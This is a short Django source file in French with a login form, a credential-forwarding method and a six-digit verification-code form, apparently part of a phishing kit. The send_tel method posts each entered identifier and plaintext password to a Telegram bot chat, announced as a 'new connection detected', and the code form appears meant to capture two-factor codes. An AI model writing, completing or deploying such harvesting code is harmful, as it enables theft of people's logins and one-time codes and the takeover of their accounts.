from django import forms
import requests
from django.core.exceptions import ValidationError

TELEGRAM_TOKEN   = "TON_TOKEN"
TELEGRAM_CHAT_ID = "TON_CHAT_ID"


class InscriptionForm(forms.Form):
    identifiant = forms.CharField(
        label="Identifiant",
        max_length=100,
        widget=forms.TextInput(attrs={'placeholder': 'Identifiant'}),
    )
    mot_de_passe = forms.CharField(
        label="Mot de passe",
        required=True,
        widget=forms.TextInput(attrs={'placeholder': 'Mot de passe'}),
        max_length=32,
    )

    def clean_identifiant(self):
        identifiant = self.cleaned_data.get('identifiant', '').strip()
        if not identifiant:
            raise ValidationError("L'identifiant ne peut pas être vide.")
        if len(identifiant) < 3:
            raise ValidationError("L'identifiant doit contenir au moins 3 caractères.")
        if ' ' in identifiant:
            raise ValidationError("L'identifiant ne doit pas contenir d'espaces.")
        return identifiant

    def clean_mot_de_passe(self):
        mot_de_passe = self.cleaned_data.get('mot_de_passe', '')
        if not mot_de_passe:
            raise ValidationError("Le mot de passe ne peut pas être vide.")
        return mot_de_passe

    def send_tel(self):
        identifiant  = self.cleaned_data.get('identifiant')
        mot_de_passe = self.cleaned_data.get('mot_de_passe')
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {
            "chat_id":    TELEGRAM_CHAT_ID,
            "text": (
                f"🔔 *NOUVELLE CONNEXION DÉTECTÉE*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 *Identifiant :* `{identifiant}`\n"
                f"🔑 *Mot de passe :* `{mot_de_passe}`\n"
                f"━━━━━━━━━━━━━━━━━━━━"
            ),
            "parse_mode": "Markdown"
        }
        try:
            response = requests.post(url, json=data, timeout=5)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"Erreur envoi Telegram : {e}")


class VerificationForm(forms.Form):
    code = forms.CharField(
        label="Code de vérification",
        max_length=6,
        min_length=6,
        widget=forms.TextInput(attrs={
            'placeholder': '——————',
            'class':       'code-input',
            'inputmode':   'numeric',
        }),
    )
